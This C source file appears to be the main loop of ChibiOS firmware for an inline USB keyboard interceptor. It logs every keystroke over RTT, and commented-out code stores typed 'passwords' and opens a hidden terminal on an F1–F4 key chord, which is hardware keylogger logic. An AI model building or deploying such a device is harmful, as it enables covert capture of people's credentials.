//main.c

#include "ch.h"
#include "hal.h"

#include "led.h"
#include "rtt.h"
#include "spi.h"
#include "usb.h"
#include "usbh.h"
#include "timer.h"

mailbox_t umb;

int main(void)
{
    halInit();
    chSysInit();

    led_init();
    rtt_init();
    spi_init();
    usb_init();
    usbh_init();
    timer_init();

    timer_on();

    uint8_t *report;

    while(1) {
        //mailbox check
        chMBFetch(&umb, (msg_t *)&report, TIME_INFINITE);

        //      /* send the key on the computer */
        //      usb_report(&UHD2, report, 8);

        //get every input in a tab
        uint16_t input = get_input_hid(report);
        rtt_printf("Key: %c (%04x)", hid2azerty(input), input);
        //      if((uint8_t)input) {
        //          inputs[input_index] = input;
        //          usbh_detector(hid2azerty(input));

        //          //input loop
        //          input_index++;
        //          if(input_index >= NB_INPUT)
        //              input_index = 0;
        //      }

        //      if(report[2] == KEY_F6)
        //          for(int i = 0; i < input_index; i++)
        //              rtt_printf("inputs[%d] = %c (%04x)", i, hid2azerty(passwords[i]), inputs[i]);

        //      if(report[2] == KEY_F5)
        //          for(int i = 0; i < password_index; i++)
        //              rtt_printf("passwords[%d] = %c (%04x)", i, hid2azerty(passwords[i]), passwords[i]);

        //      if(report[2] == KEY_F1 &&
        //         report[3] == KEY_F2 &&
        //         report[4] == KEY_F3 &&
        //         report[5] == KEY_F4)
        //          usb_password_terminal(&UHD2);
    }

    return 0;
}
